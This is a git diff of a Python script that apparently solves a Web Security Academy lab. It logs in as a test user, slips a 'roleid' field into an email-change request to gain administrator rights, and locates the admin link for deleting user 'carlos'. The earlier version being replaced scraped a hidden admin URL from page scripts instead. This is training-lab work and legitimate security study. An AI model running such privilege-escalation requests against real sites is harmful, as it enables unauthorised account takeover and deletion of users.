@@ -1,19 +1,24 @@
 import requests
 from bs4 import BeautifulSoup
 
-s = requests.session()
-site = 'ac621f1d1f4db79e819b291500640085.web-security-academy.net'
+site = 'ac3a1fdf1f277524800f73e1002e007d.web-security-academy.net'
+s = requests.Session()
+login_url = f'https://{site}/login'
+login_data = {'password': 'peter', 'username': 'wiener'}
+resp = s.post(login_url, data=login_data)
 
-url = f'https://{site}'
-resp = s.get(url)
+change_url = f'https://{site}/my-account/change-email'
+json_data = {'email': 'semchuk2@pdx.edu'}
+resp = s.post(change_url, json=json_data, allow_redirects=False)
+print(resp.status_code)
+print(resp.text)
 
-soup = BeautifulSoup(resp.text, 'html.parser')
-script = soup.find_all('script')[1].contents[0]
-match_line = [line for line in script.split('\n') if 'admin-' in line]
-uri = match_line[0].split("'")[3]
+json_data = {'email': 'semchuk2@pdx.edu', 'roleid': 2}
+resp = s.post(change_url, json=json_data, allow_redirects=False)
+print(resp.text)
 
-url = f'https://{site}{uri}'
-resp = s.get(url)
+admin_url = f'https://{site}/admin'
+resp = s.get(admin_url)
 soup = BeautifulSoup(resp.text, 'html.parser')
 
 carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]
